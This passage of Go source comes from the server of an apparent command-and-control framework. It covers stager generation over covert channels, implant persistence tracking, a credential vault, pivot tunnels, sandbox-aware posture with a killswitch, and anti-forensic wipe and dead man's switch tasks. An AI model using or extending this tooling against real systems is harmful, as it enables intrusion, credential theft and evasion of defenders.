				"agent_id": t.AgentID,
				"at":       t.Created.Unix(),
			}
			if total, ok := t.Meta["recon_total"]; ok {
				row["total"] = total
			}
			if len(t.Output) > 0 {
				row["excerpt"] = string(truncate(t.Output, 400))
			}
			findingRows = append(findingRows, row)
		}
		// The persistence: what is installed on the hosts.
		persistRows := make([]any, 0)
		for _, a := range agents {
			for _, p := range s.Hub.Store().Persistence(a.ID) {
				persistRows = append(persistRows, upk.Map{
					"agent_id":  a.ID,
					"technique": p.Technique,
					"name":      p.Name,
					"location":  p.Location,
					"state":     p.State,
				})
			}
		}
		// The sessions that are open.
		sessionRows := make([]any, 0)
		for _, sess := range s.Hub.Sessions() {
			sessionRows = append(sessionRows, upk.Map{
				"id":       sess.ID,
				"agent_id": sess.AgentID,
				"task_id":  sess.TaskID,
				"opened":   sess.Opened.Unix(),
			})
		}
		// The artefacts of the engagement.
		artifactRows := make([]any, 0)
		if s.Artifacts != nil {
			for _, e := range s.Artifacts.List() {
				artifactRows = append(artifactRows, upk.Map{
					"name":    e.Name,
					"sha256":  e.SHA256,
					"size":    int64(e.Size),
					"created": e.Created.Unix(),
				})
			}
		}
		// Who is on duty.
		opRows := make([]any, 0)
		for _, o := range s.Hub.Operators() {
			opRows = append(opRows, upk.Map{
				"name":     o.Name,
				"role":     o.Role,
				"focus":    o.Focus,
				"idle_sec": int64(o.IdleSec),
				"stale":    o.Stale,
			})
		}
		// The tail of the journal: the last moves of the engagement.
		events := s.Hub.Journal(0, 25)
		eventRows := make([]any, 0, len(events))
		for _, ev := range events {
			eventRows = append(eventRows, eventMap(ev))
		}
		return reply(upk.Map{
			"generated":   time.Now().Unix(),
			"by":          op.Name,
			"agents":      agentRows,
			"tasks":       taskRows,
			"findings":    findingRows,
			"persistence": persistRows,
			"sessions":    sessionRows,
			"artifacts":   artifactRows,
			"operators":   opRows,
			"events":      eventRows,
		})

	// ---- stagers ------------------------------------------------------
	case "stager.generate":
		platform, _ := args["platform"].(string)
		transport, _ := args["transport"].(string)
		server, _ := args["server"].(string)
		url, _ := args["url"].(string)
		digest, _ := args["sha256"].(string)
		agentID, _ := args["agent_id"].(string)
		mode, _ := args["mode"].(string)
		storeName, _ := args["store"].(string)
		storeBase, _ := args["store_base"].(string)
		dnsDomain, _ := args["dns_domain"].(string)
		dnsResolver, _ := args["dns_resolver"].(string)
		smtpAddr, _ := args["smtp_addr"].(string)
		pop3Addr, _ := args["pop3_addr"].(string)
		s3Endpoint, _ := args["s3_endpoint"].(string)
		s3Region, _ := args["s3_region"].(string)
		wsPath, _ := args["ws_path"].(string)
		if server == "" {
			server = s.Cfg.Server.AgentListen
		}
		if mode == "" {
			mode = stager.ModeDownload
		}
		if storeBase == "" {
			// The store of the server is served by the http listener, so
			// the stager that pulls from it points at that listener.
			storeBase = s.Cfg.Server.HTTPListen
		}
		if s3Region == "" {
			s3Region = s.Cfg.Server.S3Region
		}
		opts := stager.Options{
			Platform:        platform,
			Transport:       transport,
			Server:          server,
			HTTPPath:        s.Cfg.Server.HTTPPath,
			WSPath:          wsPath,
			DNSResolver:     dnsResolver,
			DNSDomain:       dnsDomain,
			SMTPAddr:        smtpAddr,
			POP3Addr:        pop3Addr,
			S3Endpoint:      s3Endpoint,
			S3Region:        s3Region,
			S3TasksBucket:   s.Cfg.Server.S3TasksBucket,
			S3ResultsBucket: s.Cfg.Server.S3ResultsBucket,
			URL:             url,
			SHA256:          digest,
			PSK:             s.Cfg.Keyring.AgentPSK,
			AgentID:         agentID,
			Mode:            mode,
			StoreName:       storeName,
			StoreBase:       storeBase,
		}
		// The offline stager carries the beacon inside itself, so the
		// operator hands the bytes of the payload over with the command.
		if payload, ok := args["payload"].([]byte); ok {
			opts.Payload = payload
		}
		script, err := stager.Render(opts)
		if err != nil {
			return fail("stager.generate: %v", err)
		}
		// The stager carries the agent PSK: it is a secret and must not be
		// pasted into a ticket. The audit log records that it was generated.
		return reply(upk.Map{
			"platform":  platform,
			"transport": transport,
			"server":    server,
			"mode":      mode,
			"stager":    script,
		})

	case "workflow.list":
		// The catalogue of the named sequences of steps, and the runs
		// that came out of them.
		workflows := s.Hub.Store().Workflows()
		rows := make([]any, 0, len(workflows))
		for _, w := range workflows {
			rows = append(rows, workflowMap(w))
		}
		runs := s.Hub.Store().WorkflowRuns(20)
		runRows := make([]any, 0, len(runs))
		for _, r := range runs {
			runRows = append(runRows, workflowRunMap(r))
		}
		return reply(upk.Map{"workflows": rows, "count": len(rows), "runs": runRows})

	case "workflow.add":
		// A workflow is written once and used by everybody: the steps are
		// data, so the team can change them without touching the server.
		name, _ := args["name"].(string)
		name = strings.TrimSpace(name)
		if name == "" {
			return fail("workflow.add needs a name")
		}
		steps, err := workflowSteps(args["steps"])
		if err != nil {
			return fail("workflow.add: %v", err)
		}
		if len(steps) == 0 {
			return fail("workflow.add needs at least one step")
		}
		description, _ := args["description"].(string)
		params := stringList(args["params"])
		w := &store.Workflow{
			Name:        name,
			Description: description,
			Params:      params,
			Steps:       steps,
			CreatedBy:   op.Name,
		}
		saved, err := s.Hub.Store().AddWorkflow(w)
		if err != nil {
			return fail("workflow.add: %v", err)
		}
		s.Hub.Store().SaveAsync()
		s.Hub.Emit(hub.Event{Kind: "workflow.created", From: op.Name,
			Data: map[string]any{"workflow": saved.Name, "steps": len(saved.Steps)}})
		return reply(upk.Map{"workflow": workflowMap(saved)})

	case "workflow.remove":
		name, _ := args["name"].(string)
		name = strings.TrimSpace(name)
		if name == "" {
			return fail("workflow.remove needs a name")
		}
		if !s.Hub.Store().RemoveWorkflow(name) {
			return fail("workflow.remove: there is no workflow called %q", name)
		}
		s.Hub.Store().SaveAsync()
		s.Hub.Emit(hub.Event{Kind: "workflow.removed", From: op.Name,
			Data: map[string]any{"workflow": name}})
		return reply(upk.Map{"removed": name})

	case "workflow.run":
		// The run happens in the background: the implant answers when it
		// checks in again, and the console does not wait for it.
		name, _ := args["name"].(string)
		name = strings.TrimSpace(name)
		if name == "" {
			return fail("workflow.run needs a name")
		}
		params := map[string]string{}
		if raw, ok := args["params"].(map[string]any); ok {
			for k, v := range raw {
				params[k] = fmt.Sprintf("%v", v)
			}
		}
		run, err := s.Hub.RunWorkflow(name, params, op.Name)
		if err != nil {
			return fail("workflow.run: %v", err)
		}
		return reply(upk.Map{"run_id": run.ID, "run": workflowRunMap(run)})

	case "workflow.status":
		// The state of one run: the steps, what they answered and the
		// report they wrote.
		id, _ := args["run_id"].(string)
		id = strings.TrimSpace(id)
		if id == "" {
			return fail("workflow.status needs run_id")
		}
		run, ok := s.Hub.Store().WorkflowRun(id)
		if !ok {
			return fail("workflow.status: there is no run called %q", id)
		}
		return reply(upk.Map{"run": workflowRunMap(run)})

	default:
		return fail("unknown command %q", cmd)
	}
}

// workflowSteps reads the steps of a workflow from the wire.
//
// The steps arrive as a list of maps; a chain carries its stages inside
// itself, so the reading is recursive.
func workflowSteps(raw any) ([]store.WorkflowStep, error) {
	list, ok := raw.([]any)
	if !ok {
		return nil, errors.New("the steps must be a list")
	}
	out := make([]store.WorkflowStep, 0, len(list))
	for _, item := range list {
		m, ok := item.(map[string]any)
		if !ok {
			return nil, errors.New("a step must be a map")
		}
		step := store.WorkflowStep{}
		step.Kind, _ = m["kind"].(string)
		step.Agent, _ = m["agent"].(string)
		step.TaskKind, _ = m["task_kind"].(string)
		step.Condition, _ = m["condition"].(string)
		step.Title, _ = m["title"].(string)
		if secs, ok := m["seconds"].(int64); ok {
			step.Seconds = int(secs)
		}
		if secs, ok := m["seconds"].(int); ok {
			step.Seconds = secs
		}
		if raw, ok := m["args"].(map[string]any); ok {
			step.Args = raw
		}
		if stages, ok := m["stages"].([]any); ok {
			nested, err := workflowSteps(stages)
			if err != nil {
				return nil, err
			}
			step.Stages = nested
		}
		out = append(out, step)
	}
	return out, nil
}

// workflowMap is the wire shape of one workflow.
func workflowMap(w *store.Workflow) upk.Map {
	if w == nil {
		return upk.Map{}
	}
	steps := make([]any, 0, len(w.Steps))
	for _, step := range w.Steps {
		steps = append(steps, workflowStepMap(step))
	}
	params := make([]any, 0, len(w.Params))
	for _, p := range w.Params {
		params = append(params, p)
	}
	row := upk.Map{
		"name":        w.Name,
		"description": w.Description,
		"params":      params,
		"steps":       steps,
		"runs":        int64(w.Runs),
		"created_by":  w.CreatedBy,
	}
	if !w.Created.IsZero() {
		row["created"] = w.Created.Unix()
	}
	if !w.LastRun.IsZero() {
		row["last_run"] = w.LastRun.Unix()
	}
	return row
}

// workflowStepMap is the wire shape of one step.
func workflowStepMap(step store.WorkflowStep) upk.Map {
	row := upk.Map{"kind": step.Kind}
	if step.Agent != "" {
		row["agent"] = step.Agent
	}
	if step.TaskKind != "" {
		row["task_kind"] = step.TaskKind
	}
	if step.Condition != "" {
		row["condition"] = step.Condition
	}
	if step.Title != "" {
		row["title"] = step.Title
	}
	if step.Seconds > 0 {
		row["seconds"] = int64(step.Seconds)
	}
	if len(step.Args) > 0 {
		row["args"] = toUpkMap(step.Args)
	}
	if len(step.Stages) > 0 {
		stages := make([]any, 0, len(step.Stages))
		for _, stage := range step.Stages {
			stages = append(stages, workflowStepMap(stage))
		}
		row["stages"] = stages
	}
	return row
}

// workflowRunMap is the wire shape of one run.
func workflowRunMap(r *store.WorkflowRun) upk.Map {
	if r == nil {
		return upk.Map{}
	}
	steps := make([]any, 0, len(r.Steps))
	for _, step := range r.Steps {
		row := upk.Map{
			"index":   int64(step.Index),
			"kind":    step.Kind,
			"ok":      step.OK,
			"code":    step.Code,
			"skipped": step.Skipped,
		}
		if step.Detail != "" {
			row["detail"] = step.Detail
		}
		if step.TaskID != "" {
			row["task_id"] = step.TaskID
		}
		if step.Output != "" {
			row["output"] = truncate([]byte(step.Output), 2000)
		}
		steps = append(steps, row)
	}
	row := upk.Map{
		"id":       r.ID,
		"workflow": r.Workflow,
		"state":    r.State,
		"steps":    steps,
		"current":  int64(r.Current),
		"by":       r.By,
	}
	if !r.Started.IsZero() {
		row["started"] = r.Started.Unix()
	}
	if !r.Finished.IsZero() {
		row["finished"] = r.Finished.Unix()
	}
	if r.Error != "" {
		row["err"] = r.Error
	}
	if r.Report != "" {
		row["report"] = r.Report
	}
	return row
}

// submitExtension ships an installed extension to an agent.
//
// The blob travels inside the task arguments, so it is bounded by the frame
// limit: extensions are small in-memory modules, not payloads.
//
// The manifest travels with it. The manifest is what says what the module
// needs from the host, and the server checks that before the module is
// queued: a module that needs a capability the agent does not have is
// refused here, where the operator can read the reason, instead of on the
// target, where the answer would be a line of text in a result.
func (s *Server) submitExtension(agentID, name string, args map[string]any) (*store.Task, error) {
	if s.Armory == nil {
		return nil, errors.New("the extension registry is not enabled")
	}
	ext, ok := s.Armory.Get(name)
	if !ok {
		return nil, fmt.Errorf("extension %q is not installed", name)
	}
	blob, err := os.ReadFile(ext.Path)
	if err != nil {
		return nil, fmt.Errorf("read extension %q: %w", name, err)
	}
	if len(blob) > armory.MaxBlobSize {
		return nil, fmt.Errorf("extension %q is too large to run in one frame", name)
	}
	agent, ok := s.Hub.Store().Agent(agentID)
	if !ok {
		return nil, fmt.Errorf("unknown agent %q", agentID)
	}
	if missing := armory.MissingCapabilities(ext.Manifest.Caps, agent.Caps); len(missing) > 0 {
		return nil, fmt.Errorf("the agent %s cannot run %s: it lacks %s",
			agentID, name, strings.Join(missing, ", "))
	}
	if args == nil {
		args = map[string]any{}
	}
	return s.Hub.SubmitTask(agentID, TaskKindExtension, upk.Map{
		"name":     name,
		"data":     blob,
		"args":     toUpkMap(args),
		"manifest": toUpkMap(ext.Manifest.ABIManifest()),
	})
}

// stringsToAny converts a string slice into an upk-encodable slice.
func stringsToAny(in []string) []any {
	out := make([]any, 0, len(in))
	for _, s := range in {
		out = append(out, s)
	}
	return out
}

// manifestMap renders a catalogue entry for the operator.
//
// The whole module ABI travels with it: the magic, the ABI number, the
// argument schema, the output schema, the capabilities the module needs and
// the modules it depends on. The operator sees what the module is before it
// is pushed anywhere.
func manifestMap(m armory.Manifest) upk.Map {
	out := upk.Map{
		"name":        m.Name,
		"version":     m.Version,
		"os":          m.OS,
		"arch":        m.Arch,
		"format":      m.Format,
		"sha256":      m.SHA256,
		"size":        m.Size,
		"description": m.Description,
		"args":        stringsToAny(m.Args),
		"caps":        stringsToAny(m.Caps),
		"requires":    stringsToAny(m.Requires),
		"schema":      argSchemaToAny(m.Schema()),
		"output":      outputMap(m.Output),
	}
	if m.Magic != "" {
		out["magic"] = m.Magic
	}
	if m.ABI != 0 {
		out["abi"] = int64(m.ABI)
	}
	return out
}

// argSchemaToAny renders the argument schema of a module.
func argSchemaToAny(in []armory.ArgSpec) []any {
	out := make([]any, 0, len(in))
	for _, arg := range in {
		entry := upk.Map{
			"name": arg.Name,
			"type": arg.Type,
		}
		if arg.Required {
			entry["required"] = true
		}
		if arg.Default != "" {
			entry["default"] = arg.Default
		}
		if arg.Help != "" {
			entry["help"] = arg.Help
		}
		out = append(out, entry)
	}
	return out
}

// outputMap renders the output schema of a module.
func outputMap(out *armory.OutputSpec) map[string]any {
	if out == nil {
		return map[string]any{}
	}
	entry := map[string]any{"type": out.Type}
	if out.Description != "" {
		entry["description"] = out.Description
	}
	return entry
}

// entriesOf renders a list of catalogue entries.
func entriesOf(in []armory.Manifest) []any {
	out := make([]any, 0, len(in))
	for _, m := range in {
		out = append(out, manifestMap(m))
	}
	return out
}

func eventMap(ev hub.Event) upk.Map {
	m := upk.Map{
		"kind": ev.Kind,
		"at":   ev.At.Unix(),
		"seq":  int64(ev.Seq),
	}
	if ev.AgentID != "" {
		m["agent_id"] = ev.AgentID
	}
	if ev.TaskID != "" {
		m["task_id"] = ev.TaskID
	}
	if ev.From != "" {
		m["from"] = ev.From
	}
	if ev.To != "" {
		m["to"] = ev.To
	}
	if ev.Data != nil {
		m["data"] = toUpkMap(ev.Data)
	}
	return m
}

func scheduleMap(sc *store.Schedule) upk.Map {
	return upk.Map{
		"id":        sc.ID,
		"agent_id":  sc.AgentID,
		"kind":      sc.Kind,
		"args":      toUpkMap(sc.Args),
		"every":     int64(sc.EverySec),
		"enabled":   sc.Enabled,
		"runs":      int64(sc.Runs),
		"next_run":  sc.NextRun.Unix(),
		"created":   sc.Created.Unix(),
		"last_task": sc.LastTask,
		"by":        sc.CreatedBy,
	}
}

// truncate shortens a blob to at most n bytes, on a rune boundary.
//
// The handover document quotes the output of the reconnaissance; the quote
// has to stay readable and the document has to stay small.
func truncate(data []byte, n int) []byte {
	if len(data) <= n {
		return data
	}
	cut := data[:n]
	for len(cut) > 0 && !utf8.Valid(cut) {
		cut = cut[:len(cut)-1]
	}
	return cut
}

// parseDeadline reads the deadline of a task.
//
// The operator may say "until 18:30" (RFC 3339) or "until 1750000000"
// (a Unix timestamp).  An empty value means no deadline at all: the task is
// worth running whenever the host comes back.
func parseDeadline(v any) (time.Time, error) {
	if v == nil {
		return time.Time{}, nil
	}
	if raw, ok := v.(string); ok {
		text := strings.TrimSpace(raw)
		if text == "" {
			return time.Time{}, nil
		}
		if ts, err := strconv.ParseInt(text, 10, 64); err == nil {
			return time.Unix(ts, 0).UTC(), nil
		}
		parsed, err := time.Parse(time.RFC3339, text)
		if err != nil {
			return time.Time{}, fmt.Errorf("the deadline %q is neither a unix timestamp nor an RFC 3339 time", text)
		}
		return parsed.UTC(), nil
	}
	if ts, ok := asInt64(v); ok {
		return time.Unix(ts, 0).UTC(), nil
	}
	return time.Time{}, errors.New("the deadline must be a unix timestamp or an RFC 3339 time")
}

// parseTimeout reads the timeout of a task: a number of seconds, or a
// duration such as "90s".  A timeout that is not positive means that the
// server's own timeout applies.
func parseTimeout(v any) (time.Duration, error) {
	if v == nil {
		return 0, nil
	}
	if raw, ok := v.(string); ok {
		text := strings.TrimSpace(raw)
		if text == "" {
			return 0, nil
		}
		if secs, err := strconv.ParseInt(text, 10, 64); err == nil {
			return time.Duration(secs) * time.Second, nil
		}
		d, err := time.ParseDuration(text)
		if err != nil {
			return 0, fmt.Errorf("the timeout %q is neither a number of seconds nor a duration", text)
		}
		return d, nil
	}
	if secs, ok := asInt64(v); ok {
		return time.Duration(secs) * time.Second, nil
	}
	return 0, errors.New("the timeout must be a number of seconds")
}

// taskMap renders a task for the operator.
//
// The claim of a task carries its state: a claim that is still held is
// "live", one whose holder is gone is "expired".  The operator sees both,
// so a task that is waiting for somebody who is not there any more does not
// look like a task that is being worked on.
func (s *Server) taskMap(t *store.Task) upk.Map {
	m := upk.Map{
		"id":       t.ID,
		"agent_id": t.AgentID,
		"kind":     t.Kind,
		"state":    t.State,
		"code":     t.Code,
		"args":     toUpkMap(t.Args),
		"created":  t.Created.Unix(),
	}
	if t.Err != "" {
		m["err"] = t.Err
	}
	if len(t.Output) > 0 {
		m["out"] = t.Output
	}
	if !t.Completed.IsZero() {
		m["completed"] = t.Completed.Unix()
	}
	if len(t.Meta) > 0 {
		m["meta"] = toUpkMap(t.Meta)
	}
	if t.ClaimedBy != "" {
		m["claimed_by"] = t.ClaimedBy
		m["claimed_at"] = t.ClaimedAt.Unix()
		m["claimed_age"] = int64(time.Since(t.ClaimedAt).Seconds())
		if s.Hub.ClaimLive(t) {
			m["claim_state"] = "live"
		} else {
			m["claim_state"] = "expired"
		}
		if expiry := s.Hub.ClaimExpiry(t); !expiry.IsZero() {
			m["claim_expires_at"] = expiry.Unix()
		}
	}
	if t.AssignedTo != "" {
		m["assigned_to"] = t.AssignedTo
		m["assigned_at"] = t.AssignedAt.Unix()
	}
	if t.TraceID != "" {
		m["trace_id"] = t.TraceID
	}
	if t.Priority != 0 {
		m["priority"] = int64(t.Priority)
	}
	if !t.Deadline.IsZero() {
		m["deadline"] = t.Deadline.Unix()
	}
	if t.TimeoutSec > 0 {
		m["timeout"] = int64(t.TimeoutSec)
	}
	if t.Attempts > 0 {
		m["attempts"] = int64(t.Attempts)
	}
	if t.ChainID != "" {
		m["chain_id"] = t.ChainID
		m["stage"] = int64(t.Stage)
	}
	return m
}

func agentDataMap(a *store.Agent) map[string]any {
	return map[string]any{
		"id":         a.ID,
		"host":       a.Host,
		"os":         a.OS,
		"arch":       a.Arch,
		"user":       a.User,
		"pid":        a.PID,
		"version":    a.Version,
		"transport":  a.Transport,
		"addr":       a.Addr,
		"sleep":      a.Sleep,
		"jitter":     a.Jitter,
		"state":      a.State,
		"checkins":   a.Checkins,
		"tags":       a.Tags,
		"first_seen": a.FirstSeen.Format(time.RFC3339),
		"last_seen":  a.LastSeen.Format(time.RFC3339),
		// The capability list is what the beacon said it can run, so the
		// operator knows the host's reach before a task is queued.
		"caps":     a.Caps,
		"panicked": a.Panicked,
		// What is installed on the host, and whether it is still there.
		"persist": a.Persist,
		// What the implant thinks of the host.
		"posture": a.Posture,
		// The account the implant runs as, when it is not the account it
		// started with.
		"impersonation": a.Impersonation,
	}
}

// pivotTopology turns the picture of the reach into the wire form.
//
// The dashboard and the console read the same structure, so the shape is
// decided once, here.
func pivotTopology(top pivot.Topology) upk.Map {
	nodes := make([]any, 0, len(top.Nodes))
	for _, node := range top.Nodes {
		nodes = append(nodes, upk.Map{
			"agent_id":  node.AgentID,
			"role":      node.Role,
			"transport": node.Transport,
			"online":    node.Online,
			"tunnels":   int64(node.Tunnels),
		})
	}
	edges := make([]any, 0, len(top.Edges))
	for _, edge := range top.Edges {
		edges = append(edges, upk.Map{
			"tunnel":      edge.Tunnel,
			"agent_id":    edge.AgentID,
			"through":     edge.Through,
			"mode":        edge.Mode,
			"listen":      edge.Listen,
			"host":        edge.Host,
			"port":        int64(edge.Port),
			"streams":     int64(edge.Streams),
			"bytes_up":    edge.BytesUp,
			"bytes_down":  edge.BytesDown,
			"last_active": edge.LastActive,
			"state":       edge.State,
			"claim":       edge.Claim,
			"dns":         edge.DNS,
		})
	}
	clients := make([]any, 0, len(top.Clients))
	for _, client := range top.Clients {
		clients = append(clients, upk.Map{
			"address":     client.Address,
			"connections": client.Connections,
			"bytes_up":    client.BytesUp,
			"bytes_down":  client.BytesDown,
			"first":       client.First.Unix(),
			"last":        client.Last.Unix(),
		})
	}
	connections := make([]any, 0, len(top.Connections))
	for _, conn := range top.Connections {
		connections = append(connections, upk.Map{
			"client":     conn.Client,
			"target":     conn.Target,
			"port":       int64(conn.Port),
			"bytes_up":   conn.BytesUp,
			"bytes_down": conn.BytesDown,
			"at":         conn.At.Unix(),
			"state":      conn.State,
		})
	}
	claims := upk.Map{}
	for name, ids := range top.Claims {
		list := make([]any, 0, len(ids))
		for _, id := range ids {
			list = append(list, id)
		}
		claims[name] = list
	}
	return upk.Map{
		"nodes":       nodes,
		"edges":       edges,
		"clients":     clients,
		"connections": connections,
		"claims":      claims,
		"sessions":    int64(top.Sessions),
		"tunnels":     int64(top.Tunnels),
	}
}

// credentialMap is the record of the vault as the operator sees it.
//
// The secret is not in here: the value comes out of the vault with
// creds.export, and only for the operators the role table allows.
func credentialMap(c *store.Credential) map[string]any {
	return map[string]any{
		"id":         c.ID,
		"agent_id":   c.AgentID,
		"source":     c.Source,
		"account":    c.Account,
		"target":     c.Target,
		"kind":       c.Kind,
		"digest":     c.Digest,
		"confidence": c.Confidence,
		"note":       c.Note,
		"collected":  c.Collected.Format(time.RFC3339),
	}
}

// chainStages reads the stages of a multi-stage task.
//
// A stage is a map with a "kind" and optional "args". The stages arrive as
// a list of maps, which is what the upk encoding produces.
func chainStages(v any) ([]hub.ChainStage, error) {
	items, ok := v.([]any)
	if !ok {
		return nil, errors.New("a chain needs a list of stages")
	}
	out := make([]hub.ChainStage, 0, len(items))
	for i, item := range items {
		m, ok := item.(map[string]any)
		if !ok {
			return nil, fmt.Errorf("stage %d is not a map", i)
		}
		kind, _ := m["kind"].(string)
		if kind == "" {
			return nil, fmt.Errorf("stage %d has no kind", i)
		}
		stage := hub.ChainStage{Kind: kind}
		if raw, ok := m["args"].(map[string]any); ok {
			stage.Args = raw
		} else {
			stage.Args = map[string]any{}
		}
		out = append(out, stage)
	}
	return out, nil
}

// stringList reads a list of strings from an RPC argument.
//
// A single comma separated string is accepted as well: an operator types
// "a,b,c" far more often than a script builds a list.
func stringList(v any) []string {
	switch items := v.(type) {
	case []any:
		out := make([]string, 0, len(items))
		for _, item := range items {
			if s, ok := item.(string); ok && s != "" {
				out = append(out, s)
			}
		}
		return out
	case []string:
		return items
	case string:
		parts := strings.Split(items, ",")
		out := make([]string, 0, len(parts))
		for _, p := range parts {
			p = strings.TrimSpace(p)
			if p != "" {
				out = append(out, p)
			}
		}
		return out
	}
	return nil
}

// agentFilter reads the filter of an RPC argument.
//
// The filter may sit in a nested "filter" map or as flat arguments, so both
// `{"filter":{"state":"online"}}` and `{"state":"online"}` work.
func agentFilter(args map[string]any) hub.AgentFilter {
	f := hub.AgentFilter{}
	read := func(m map[string]any) {
		if v, ok := m["state"].(string); ok && v != "" {
			f.State = v
		}
		if v, ok := m["transport"].(string); ok && v != "" {
			f.Transport = v
		}
		if v, ok := m["os"].(string); ok && v != "" {
			f.OS = v
		}
		if v, ok := m["arch"].(string); ok && v != "" {
			f.Arch = v
		}
		if v, ok := m["tag"].(string); ok && v != "" {
			f.Tag = v
		}
		if v, ok := m["user"].(string); ok && v != "" {
			f.User = v
		}
		if v, ok := m["persisted"].(string); ok && v != "" {
			f.Persisted = v
		}
		if ids := stringList(m["agents"]); len(ids) > 0 {
			f.IDs = ids
		}
	}
	if raw, ok := args["filter"].(map[string]any); ok {
		read(raw)
	}
	read(args)
	return f
}

// selectTargets resolves the agents an operation applies to.
//
// The operator either names the agents or describes them with a filter.  An
// operation without either is refused: a bulk task that hits every agent in
// the inventory because a filter was forgotten is not recoverable.
func (s *Server) selectTargets(args map[string]any) ([]*store.Agent, error) {
	filter := agentFilter(args)
	if ids := stringList(args["agents"]); len(ids) > 0 {
		filter.IDs = ids
	} else if ids := stringList(args["ids"]); len(ids) > 0 {
		filter.IDs = ids
	}
	empty := len(filter.IDs) == 0 && filter.State == "" && filter.Transport == "" &&
		filter.OS == "" && filter.Arch == "" && filter.Tag == "" && filter.User == "" &&
		filter.Persisted == ""
	if empty {
		return nil, errors.New("no targets: name the agents or describe them with a filter")
	}
	return s.Hub.SelectAgents(filter), nil
}

// toUpkMap converts arbitrary maps into upk-encodable maps, dropping values the
// encoder cannot represent (never silently corrupting a payload).
func toUpkMap(in map[string]any) upk.Map {
	out := make(upk.Map, len(in))
	for k, v := range in {
		out[k] = upkValue(v)
	}
	return out
}

func upkValue(v any) any {
	switch x := v.(type) {
	case nil, bool, string, []byte, int, int64, uint64, float64, []any:
		return x
	case []string:
		out := make([]any, 0, len(x))
		for _, item := range x {
			out = append(out, item)
		}
		return out
	case int32:
		return int64(x)
	case uint32:
		return uint64(x)
	case uint:
		return uint64(x)
	case map[string]any:
		return toUpkMap(x)
	case map[string]string:
		m := make(upk.Map, len(x))
		for k, val := range x {
			m[k] = val
		}
		return m
	case []map[string]any:
		out := make([]any, 0, len(x))
		for _, item := range x {
			out = append(out, toUpkMap(item))
		}
		return out
	case *store.PostureEntry:
		// The posture of the host: what the implant thinks it is.
		if x == nil {
			return nil
		}
		return upk.Map{
			"label":        x.Label,
			"virtual":      x.Virtual,
			"workstation":  x.Workstation,
			"developer":    x.Developer,
			"lab":          x.Lab,
			"sandbox":      x.Sandbox,
			"confidence":   x.Confidence,
			"severity":     x.Severity,
			"sleep_factor": x.SleepFactor,
			"silent":       x.Silent,
			"killswitch":   x.KillSwitch,
		}
	case []store.PersistEntry:
		// The persistence entries of an agent: the operator has to see
		// what is installed on the host and whether it is still there.
		out := make([]any, 0, len(x))
		for _, item := range x {
			out = append(out, upk.Map{
				"technique":    item.Technique,
				"name":         item.Name,
				"trigger":      item.Trigger,
				"location":     item.Location,
				"detail":       item.Detail,
				"binary":       item.Binary,
				"state":        item.State,
				"installed_at": item.InstalledAt,
			})
		}
		return out
	case time.Time:
		return x.UTC().Format(time.RFC3339)
	default:
		return fmt.Sprintf("%v", x)
	}
}

// forensicGuardedKinds are the task kinds that end an engagement.
//
// They are refused to everybody but an admin, whichever path the task
// travels: the dedicated command and the generic task submission are
// the same door, and a task that burns a host does not become less
// destructive because it was queued in another way.
var forensicGuardedKinds = map[string]bool{
	"wipe.self":    true,
	"decommission": true,
	// The dead man's switch ends the implant on the host when the
	// operator goes quiet, so arming it is the end of an engagement
	// waiting to happen.
	"wipe.deadman": true,
}

// forensicGuard refuses a task that ends an engagement to a role that
// may not end one.
func forensicGuard(role, kind string) error {
	if !forensicGuardedKinds[kind] {
		return nil
	}
	if rbac.AtLeast(role, rbac.Admin) {
		return nil
	}
	return fmt.Errorf("the task %q ends the engagement on the host: it requires the role %s",
		kind, rbac.Admin)
}

// forensicTaskKind is the task kind of a forensics command.
//
// The operator thinks in verbs ("what is on this host", "wipe it"),
// and the implants think in the names of their own tasks.  The server
// is the place where the two are put together.
func forensicTaskKind(cmd string) string {
	switch cmd {
	case "forensics.survey":
		return "wipe.survey"
	case "forensics.wipe":
		return "wipe.run"
	case "forensics.verify":
		return "wipe.verify"
	case "forensics.report":
		return "forensics.report"
	case "forensics.timeline":
		return "forensics.timeline"
	case "forensics.self":
		return "wipe.self"
	case "forensics.decommission":
		return "decommission"
	case "forensics.deadman":
		return "wipe.deadman"
	}
	return "wipe.survey"
}

// anyList turns a list of strings into the list the encoder writes.
//
// The encoder of the protocol knows the arrays of values and not the
// arrays of strings, so a list that travels has to be converted before
// it is put into the arguments of a task.
func anyList(items []string) []any {
	out := make([]any, 0, len(items))
	for _, item := range items {
		out = append(out, item)
	}
	return out
}

// huntIndicatorPayload turns the indicators of a sweep into the payload
// the implant receives.
//
// The implant is told the kind, the value and the label of every
// indicator, and nothing else: the note and the source stay on the
// server, because they are the words of the team and the host has no
// business reading them.
func huntIndicatorPayload(payload hunt.Indicators) []any {
	out := make([]any, 0, len(payload.Items))
	for _, ind := range payload.Items {
		out = append(out, upk.Map{
			"id":    ind.ID,
			"kind":  ind.Kind,
			"value": ind.Value,
			"label": ind.Label,
		})
	}
	return out
}

// approvalMap renders a request of the queue for the wire.
//
// noteMap renders one note for the wire.
//
// A note is a short line of words: the operator who wrote it, when it
// was written, and what it says.  The wire carries them as they are.
func noteMap(entry note.Note) upk.Map {
	out := upk.Map{
		"id":       entry.ID,
		"agent_id": entry.AgentID,
		"text":     entry.Text,
		"author":   entry.Author,
		"written":  entry.Written.Format(time.RFC3339),
	}
	if entry.Pinned {
		out["pinned"] = true
	}
	return out
}

// hookMap renders one wire for the wire.
//
// The answer carries the address, the kinds and the last post, never
// the secret: the word the posts are signed with belongs to the file
// of the server, and a list that leaked it would be a wire the team
// did not choose.
func hookMap(entry hook.Hook, last hook.Delivery, found bool) upk.Map {
	out := upk.Map{
		"id":      entry.ID,
		"url":     entry.URL,
		"kinds":   pathAny(entry.Kinds),
		"creator": entry.Creator,
		"created": entry.Created.Format(time.RFC3339),
	}
	if found {
		out["last"] = deliveryMap(last)
	}
	return out
}

// deliveryMap renders one post the server made down a wire.
func deliveryMap(d hook.Delivery) upk.Map {
	out := upk.Map{
		"hook_id":    d.HookID,
		"kind":       d.Kind,
		"when":       d.When.Format(time.RFC3339),
		"status":     int64(d.Status),
		"latency_ms": d.LatencyMS,
	}
	if d.Seq != 0 {
		out["seq"] = int64(d.Seq)
	}
	if d.Err != "" {
		out["err"] = d.Err
	}
	return out
}

// usageMap renders one technique of the wall: the number and the name
// the trade talks in, how often it was the work of the team, on which
// hosts and when last.
func usageMap(usage attack.Usage) upk.Map {
	out := upk.Map{
		"id":     usage.ID,
		"name":   usage.Name,
		"tactic": usage.Tactic,
		"tasks":  int64(usage.Tasks),
	}
	if len(usage.Agents) > 0 {
		out["agents"] = pathAny(usage.Agents)
	}
	if !usage.Last.IsZero() {
